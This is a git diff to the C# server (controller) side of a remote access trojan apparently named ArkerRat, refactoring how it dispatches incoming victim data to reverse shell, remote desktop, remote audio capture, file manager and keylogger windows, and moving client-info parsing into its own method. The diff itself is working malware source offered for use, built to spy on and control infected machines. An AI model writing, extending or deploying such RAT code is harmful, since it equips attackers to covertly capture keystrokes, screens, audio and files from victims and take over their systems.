@@ -17,6 +17,7 @@ using ArkerRatWpfVersion;
 using System.Windows.Markup;
 using System.Xml.Linq;
 using System.Collections.Concurrent;
+using System.Data.SqlTypes;
 //using static System.Windows.Forms.VisualStyles.VisualStyleElement;
 
 namespace ArkerRatWpfVersion
@@ -34,7 +35,7 @@ namespace ArkerRatWpfVersion
             IPAddress = "Unknown",
             MS = "Unknown"
         };
-        
+
         public int port = 0;
         public string tags { get; set; }
         public double ms = 0;
@@ -53,18 +54,18 @@ namespace ArkerRatWpfVersion
 
             ReadData();
             Ping();
-            
+
         }
 
         public async Task SendData(string textData)
         {
-                try
-                {
-                    byte[] data = Encoding.UTF8.GetBytes(textData);
-                    await clientStream.WriteAsync(data, 0, data.Length);
-                    await clientStream.FlushAsync();
-                }
-            catch(Exception ex) { }
+            try
+            {
+                byte[] data = Encoding.UTF8.GetBytes(textData);
+                await clientStream.WriteAsync(data, 0, data.Length);
+                await clientStream.FlushAsync();
+            }
+            catch (Exception ex) { }
         }
 
 
@@ -121,130 +122,51 @@ namespace ArkerRatWpfVersion
                     int startIndex = data.IndexOf(startDelimiter) + startDelimiter.Length;
                     int endIndex = data.IndexOf(endDelimiter) - 1;
 
-                   
-
-                    if (startIndex != -1 && endIndex != -2 /*-2 because its always one less than the standard return -1 if you look at the squence abow*/&&startIndex<=endIndex+1)
+                    if (startIndex != -1 && endIndex != -2 /*-2 because its always one less than the standard return -1 if you look at the squence abow*/&& startIndex <= endIndex + 1)
                     {
                         string subString = string.Empty;
 
-                        lock (GlobalVariables._lock)
-                        {
-                                subString = data.Substring(startIndex, endIndex - startIndex + 1);   
-                            data = data.Replace(startDelimiter + subString + endDelimiter, string.Empty);
-                        }
 
-                        //if (subString?.Length != null || subString?.Length != 0)
-                        if (startDelimiter == "§ReverseShellStart§")
-                        {
-                            reverseShellWindow.ReversShellFunction(subString);
-                        }
-                        else if (startDelimiter == "§RemoteDesktopStart§" && remoteDesktopWindowIsAlreadyOpen == true)
-                        {
-                            if (subString.Contains("§screen§"))
-                            {
-                                remoteDesktopWindow.AddScreens(subString);
-                            }
-                            else
-                            {
-                                remoteDesktopWindow.frameQue.Enqueue(subString);
-                            }
-                        }
-                        else if (startDelimiter=="§RemoteAudioStart§")
-                        {
-                            if (subString.Contains("§ODS§"))
-                            {
-                                subString = subString.Replace("§ODS§", string.Empty);
-                                Task.Run(()=> remoteAudioWindow.AddODevices(subString));
-                            }
-                            else if (subString.Contains("§IDS§"))
-                            {
-                                subString = subString.Replace("§IDS§", string.Empty);
-                                Task.Run(() => remoteAudioWindow.AddIDevices(subString));
-                            }
-                            else
-                            {
-                                remoteAudioWindow?.EnqueAudioData(subString);
-                            }
-                        }
-                        else if(startDelimiter == "§FileManagerStart§")
-                        {
-                            if (subString.Contains("§UF§"))
-                            {
-                                subString = subString.Replace("§UF§", string.Empty);
+                        subString = data.Substring(startIndex, endIndex - startIndex + 1);
+                        data = data.Replace(startDelimiter + subString + endDelimiter, string.Empty);
 
-                                if (subString.Contains("§start§") && !fileManagerWindow.download)
-                                {
-                                    subString= subString.Replace("§start§", string.Empty);
-                                    Task.Run(() => fileManagerWindow.StartDownloadingFile(subString));
-                                }
-                                else if (subString == "§end§")
-                                {
-                                    fileManagerWindow.download = false;
-                                    fileManagerWindow.dataBuffer = new ConcurrentQueue<string>();
-                                }
-                                else
-                                {
-                                    fileManagerWindow.dataBuffer.Enqueue(subString);
-                                }
-                            }
-                            else
-                            {
-                               Task.Run(()=>fileManagerWindow.GenerateFileSystem(subString));
-                            }
-                        }
-                        else if(startDelimiter == "§KeyLoggerStart§")
+
+                        switch (startDelimiter)
                         {
-                            if (subString.Contains("§OFK§"))
-                            {
-                                subString = subString.Replace("§OFK§", string.Empty);
+                            case "§ReverseShellStart§":
+                                reverseShellWindow?.HandleData(subString);
+                                break;
 
-                                if (subString == "start")
-                                {
-                                    Task.Run(() => keyLoggerWindow.StartDownloadingFile());
-                                }
-                                else if (subString == "end")
-                                {
-                                    keyLoggerWindow.download= false;
-                                    keyLoggerWindow.dataBuffer = new ConcurrentQueue<string>();
-                                }
-                                else
-                                {
-                                    keyLoggerWindow.AddDataToBuffer(subString);
-                                }
-                            }
-                            else
-                            {
-                                keyLoggerWindow.WriteKeyInputToTextBox(subString);
-                            }
-                            
+                            case "§RemoteDesktopStart§":
+                                remoteDesktopWindow?.HandleData(subString);
+                                break;
+
+                            case "§RemoteAudioStart§":
+                                remoteAudioWindow?.HandleData(subString);
+                                break;
+
+                            case "§FileManagerStart§":
+                                fileManagerWindow?.HandleData(subString);
+                                break;
+
+                            case "§KeyLoggerStart§":
+                                keyLoggerWindow?.HandleData(subString);
+                                break;
+
+                            case "§ClientInfoStart§":
+                                SortClientInfoData(subString);
+                                break;
+
+                            case "§PingStart§":
+                                whenToStartPinging = "§Ping§";
+                                break;
                         }
-                        else if (startDelimiter == "§PingStart§")
-                        {
-                            whenToStartPinging = "§Ping§";
-                        }
-                        else if (startDelimiter == "§ClientInfoStart§")
-                        {
-                            int startIndexx = subString.IndexOf("§ResulotionStart§") + 17;
-                            int endIndexx = subString.IndexOf("§ResulotionEnd§")-1;
-                            string info = subString.Substring(startIndexx, endIndexx - startIndexx + 1);
-                            resulotion = info.Split(',');
-
-                            string[] tempInfo = (subString.Replace("§ResulotionStart§" + info + "§ResulotionEnd§", string.Empty)).Split(',');
-
-                            for (int i = 0; i < tempInfo.Length; i++)
-                            {
-                                clientInfo[i] = tempInfo[i];
-                            }
-
-                            Task.Run(async() => GlobalMethods.ShowNotification("Client connected", clientInfo[0]+" has connected at port:"+port));
-                        }                      
                     }
                     else
                     {
                         break;
                     }
                 }
-              
             } while (true);
         }
 
@@ -254,7 +176,7 @@ namespace ArkerRatWpfVersion
         Stopwatch stopwatch;
         private async void Ping()
         {
-            await Task.Run(async() =>
+            await Task.Run(async () =>
             {
                 while (!token.IsCancellationRequested)
                 {
@@ -270,19 +192,35 @@ namespace ArkerRatWpfVersion
                         whenToStartPinging = "";
                         stopwatch.Stop();
                     }
-                    else if(stopwatch.ElapsedMilliseconds > 10000)
+                    else if (stopwatch.ElapsedMilliseconds > 10000)
                     {
                         stopwatch.Stop();
                         RemoveThisClientUI();
-                        await GlobalMethods.ShowNotification("Client disconnected",clientInfo[0]+ " disconnected, timed out");
+                        await GlobalMethods.ShowNotification("Client disconnected", clientInfo[0] + " disconnected, timed out");
                         await SendData("§ReconnectStart§§ReconnectEnd§");
                     }
                     await Task.Delay(1);
                 }
-
             });
         }
-       
+
+        private void SortClientInfoData(string subString)
+        {
+            int startIndexx = subString.IndexOf("§ResulotionStart§") + 17;
+            int endIndexx = subString.IndexOf("§ResulotionEnd§") - 1;
+            string info = subString.Substring(startIndexx, endIndexx - startIndexx + 1);
+            resulotion = info.Split(',');
+
+            string[] tempInfo = (subString.Replace("§ResulotionStart§" + info + "§ResulotionEnd§", string.Empty)).Split(',');
+
+            for (int i = 0; i < tempInfo.Length; i++)
+            {
+                clientInfo[i] = tempInfo[i];
+            }
+
+            Task.Run(async () => GlobalMethods.ShowNotification("Client connected", clientInfo[0] + " has connected at port:" + port));
+        }
+
         public async void Disconnect(object sender, EventArgs e)
         {
             RemoveThisClientUI();
@@ -299,18 +237,14 @@ namespace ArkerRatWpfVersion
 
         public async void RemoveThisClientUI()
         {
-           await Task.Run(() =>
+            await Task.Run(() =>
             {
-
                 ArkerRATServerMechanics.rATClients.Remove(this);
                 source.Cancel();
                 clientStream.Close();
                 client.Close();
 
-
-
                 CloseAllTheWindows();
-
             });
         }
         //______________________________________________________________
@@ -328,7 +262,7 @@ namespace ArkerRatWpfVersion
 
             try
             {
-                remoteDesktopWindow.Dispatcher.BeginInvoke(new Action(() =>
+                remoteDesktopWindow.Dispatcher.Invoke(new Action(() =>
                 {
                     remoteDesktopWindow.CloseWindow(null, null);
                 }));
@@ -337,7 +271,7 @@ namespace ArkerRatWpfVersion
 
             try
             {
-                fileManagerWindow.Dispatcher.BeginInvoke(new Action(() =>
+                fileManagerWindow.Dispatcher.Invoke(new Action(() =>
                 {
                     fileManagerWindow.CloseWindow(null, null);
                 }));
@@ -346,7 +280,7 @@ namespace ArkerRatWpfVersion
 
             try
             {
-                remoteAudioWindow.Dispatcher.BeginInvoke(new Action(() =>
+                remoteAudioWindow.Dispatcher.Invoke(new Action(() =>
                 {
                     remoteAudioWindow.CloseWindow(null, null);
                 }));
@@ -355,7 +289,7 @@ namespace ArkerRatWpfVersion
 
             try
             {
-                remoteAudioWindow.Dispatcher.BeginInvoke(new Action(() =>
+                remoteAudioWindow.Dispatcher.Invoke(new Action(() =>
                 {
                     keyLoggerWindow.CloseWindow(null, null);
                 }));
@@ -366,7 +300,8 @@ namespace ArkerRatWpfVersion
         public ReverseShellWindow reverseShellWindow;
         public bool reverseShellWindowIsAlreadyOpen = false;
         public void StartReverseShell(object sender, EventArgs e)
-        {   if(!reverseShellWindowIsAlreadyOpen)
+        {
+            if (!reverseShellWindowIsAlreadyOpen)
             {
                 reverseShellWindow = new ReverseShellWindow(this);
                 reverseShellWindow.WindowState = WindowState.Normal;
